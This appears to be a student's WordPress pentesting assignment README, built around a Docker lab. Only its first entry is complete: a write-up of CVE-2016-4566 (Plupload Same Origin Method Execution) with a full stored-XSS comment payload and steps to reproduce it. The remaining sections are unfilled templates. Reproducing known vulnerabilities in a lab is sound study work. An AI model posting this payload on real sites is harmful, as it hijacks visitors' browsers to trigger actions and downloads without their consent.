# Project 7 - WordPress Pentesting

> Time spent: 5+ hours spent in total

> Objective: Find, analyze, recreate, and document **three to five vulnerabilities** affecting an old version of WordPress

## Test Environment

Created virtual environment in Docker.
  - [ ] GIF Walkthrough: 
  
		<img src="docker-wpVSkali.gif" alt="docker-wpVSkali Walkthrough">
		
## Pentesting Report

### 1. WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME) - CVE-2016-4566
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting (XSS)
    - Tested in version: 4.1
    - Fixed in version: 4.1.11 
  - [ ] GIF Walkthrough: 
  
		<img src="SOMExss.gif" alt="CVE-2016-4566 Walkthrough">
		
  - [ ] Steps to recreate: 
  
		1. As a logged in user, leaving a reply/comment to a post using the payload:
			
		2.	```
			<button onclick="fire()">Click</button>
			<script>
			function fire() {
			open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
			setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
				}
			</script>	
			```
			
			
		3. After this comment posts sucessfully, any user that comes across the post will see a clickable button for the comment. If that user clicks the button, the XSS attack will execute and attempt to download a malicious payload from the attack. 
			
			
		4. In the gif walkthrough, my browser extentions sucessfully blocks the attack from downloading the file, but a user without the proper safeguards would be prompted to download a file. 
			
  - [ ] References:
    - [Link 1: wpscan] (https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06)
	- [Link 2: cve.mitre] (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566)
	- [Link 3: wordpress.org] (https://wordpress.org/news/2016/05/wordpress-4-5-2/)
	- [Link 4: github/wordpress] (https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8)
	- [Link 5: gist.github] (https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e)
### 2. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 4. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 


## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)
- [wpVSkali] (https://github.com/0xrutvij/wpVSkali)


GIFs created with [ScreenToGif](https://www.screentogif.com).

## Notes

- Other notes:

## License

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
